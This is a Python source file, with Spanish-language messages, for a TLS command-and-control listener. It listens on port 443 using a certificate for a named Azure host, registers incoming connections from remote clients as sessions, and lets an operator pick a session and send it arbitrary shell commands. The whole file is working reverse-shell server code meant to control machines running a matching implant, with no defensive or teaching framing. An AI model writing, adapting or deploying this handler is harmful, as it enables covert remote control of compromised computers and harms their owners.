import socket
import ssl
import threading
import queue

LHOST = '0.0.0.0'
LPORT = 443
BUFFER_SIZE = 4096

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
context.load_cert_chain(certfile="/etc/letsencrypt/live/winserver.eastus.cloudapp.azure.com/fullchain.pem", keyfile="/etc/letsencrypt/live/winserver.eastus.cloudapp.azure.com/privkey.pem")

sessions = []
lock = threading.Lock()

class ClientSession:
    def __init__(self, conn, addr, info):
        self.conn = conn
        self.addr = addr
        self.info = info
        self.output = queue.Queue()
        self.active = True
        self.thread = threading.Thread(target=self.listen_to_client, daemon=True)
        self.thread.start()

    def listen_to_client(self):
        while self.active:
            try:
                data = self.conn.recv(BUFFER_SIZE)
                if not data:
                    break
                self.output.put(data.decode('utf-8', errors='replace'))
            except:
                break
        self.active = False
        self.conn.close()

    def send_command(self, cmd):
        try:
            self.conn.send(cmd.encode('utf-8'))
        except Exception as e:
            print(f"[!] Error al enviar comando: {e}")
            self.active = False

    def read_output(self):
        out = ""
        while not self.output.empty():
            out += self.output.get()
        return out if out else "[sin salida]"

def handle_new_connection(conn, addr):
    try:
        info = conn.recv(BUFFER_SIZE).decode("utf-8")
        session = ClientSession(conn, addr, info)
        with lock:
            sessions.append(session)
        print(f"[+] Nueva sesión registrada: {addr} - {info}")
    except Exception as e:
        print(f"[!] Error al registrar sesión: {e}")
        conn.close()

def accept_connections(tls_server):
    while True:
        try:
            conn, addr = tls_server.accept()
            threading.Thread(target=handle_new_connection, args=(conn, addr), daemon=True).start()
        except Exception as e:
            print(f"[!] Error al aceptar conexión: {e}")

def session_menu():
    while True:
        print("\n=== Gestor de Sesiones ===")
        with lock:
            for idx, s in enumerate(sessions):
                status = "Activa" if s.active else "Cerrada"
                print(f"[{idx}] {s.addr} - {s.info} ({status})")
        print("[x] Salir")

        choice = input("Selecciona una sesión (número) > ")
        if choice.lower() == 'x':
            break

        try:
            idx = int(choice)
            with lock:
                session = sessions[idx]
            if not session.active:
                print("[!] Esta sesión está cerrada.")
                continue
            control_session(session)
        except (IndexError, ValueError):
            print("[!] Selección inválida.")

def control_session(session):
    print(f"[*] Interactuando con {session.addr} - Escribe 'back' para volver al menú.\n")
    while session.active:
        cmd = input("CMD > ")
        if cmd.lower() == "back":
            print("[~] Saliendo de la sesión.")
            return
        session.send_command(cmd)
        print("[~] Esperando salida...")
        # Espera breve para acumular la salida
        threading.Event().wait(0.5)
        output = session.read_output()
        print(output)
    print("[x] Sesión cerrada.")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((LHOST, LPORT))
        server_socket.listen(5)
        print(f"[+] Servidor TLS escuchando en {LHOST}:{LPORT}")

        with context.wrap_socket(server_socket, server_side=True) as tls_server:
            threading.Thread(target=accept_connections, args=(tls_server,), daemon=True).start()
            session_menu()

if __name__ == "__main__":
    main()
